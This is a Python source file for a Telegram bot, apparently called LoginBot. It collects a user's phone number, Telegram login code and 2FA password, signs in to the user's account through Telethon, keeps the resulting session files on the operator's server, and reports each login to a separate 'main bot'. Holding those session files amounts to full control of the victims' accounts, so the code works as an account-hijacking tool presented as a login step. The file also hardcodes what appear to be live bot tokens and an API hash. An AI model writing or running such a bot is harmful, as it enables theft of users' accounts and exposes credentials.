import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import requests

# Replace with your bot's API keys
BOT_TOKEN = "8369950751:AAEcXGtfXUt3nJaMlTiTOX2StRcQi11plVs"
API_ID = 24945402
API_HASH = "6118e50f5dc4e3a955e50b22cf673ae2"
MAIN_BOT_TOKEN = "8423764247:AAGkPXB6eaCvHUrUtcqQ8bbBgG6fnIqjFQY"
MAIN_BOT_USERNAME = "@CosmicAdminsOnlyBot"

# Conversation States
ASK_PHONE, ASK_OTP, ASK_2FA = range(3)
user_clients, user_phones = {}, {}

# Function to store session
def get_session_name(user_id):
    os.makedirs("sessions", exist_ok=True)
    return f"sessions/{user_id}"

# Command for starting the login flow
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📱 Send your phone number (with +countrycode):")
    return ASK_PHONE

# Handling the phone number input from user
async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    phone = update.message.text.strip()
    user_phones[uid] = phone
    client = TelegramClient(get_session_name(uid), API_ID, API_HASH)

    try:
        await client.connect()
        # Send the OTP request
        await client.send_code_request(phone)
        user_clients[uid] = client
        await update.message.reply_text("✅ OTP sent. Please enter it [Give spaces between digits]:")
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send OTP: {e}")
        return ConversationHandler.END

# Handling OTP input from user
async def otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    otp = update.message.text.strip()
    phone = user_phones.get(uid)
    client = user_clients[uid]

    try:
        await client.sign_in(phone=phone, code=otp)
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 2FA enabled. Send password:")
        return ASK_2FA
    except Exception as e:
        await update.message.reply_text(f"❌ OTP failed: {e}")
        return ConversationHandler.END

    # Notify the main bot for user approval after login
    try:
        approval_message = f"User {uid} has successfully logged in via the login bot."
        await approve_user_in_main_bot(approval_message)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to notify the main bot: {e}")
        return ConversationHandler.END

    await client.disconnect()
    await update.message.reply_text("🎉 Login successful! You can now use the main bot.")
    return ConversationHandler.END

# Handling 2FA (two-factor authentication) if enabled
async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    pwd = update.message.text.strip()
    client = user_clients[uid]

    try:
        await client.sign_in(password=pwd)
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA failed: {e}")
        return ConversationHandler.END

    # Notify the main bot for user approval after successful 2FA login
    try:
        approval_message = f"User {uid} has successfully completed 2FA."
        await approve_user_in_main_bot(approval_message)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to notify the main bot: {e}")
        return ConversationHandler.END

    await client.disconnect()
    await update.message.reply_text("🎉 2FA successful! You can now use the main bot.")
    return ConversationHandler.END

# Function to notify the main bot for user approval
async def approve_user_in_main_bot(message: str):
    try:
        # Send a message to the main bot for approval
        bot_url = f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": MAIN_BOT_USERNAME,
            "text": message,
        }
        response = requests.get(bot_url, params=params)
        if response.status_code == 200:
            print(f"Successfully notified the main bot: {message}")
        else:
            print(f"Failed to notify the main bot: {response.text}")
    except Exception as e:
        print(f"Error while notifying the main bot: {e}")

# Canceling the process
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Login process canceled.")
    return ConversationHandler.END

# Main function to set up the bot
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Create the conversation handler for the login process
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone)],
            ASK_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp)],
            ASK_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)
    print("LoginBot is running…")
    app.run_polling()

if __name__ == "__main__":
    main()
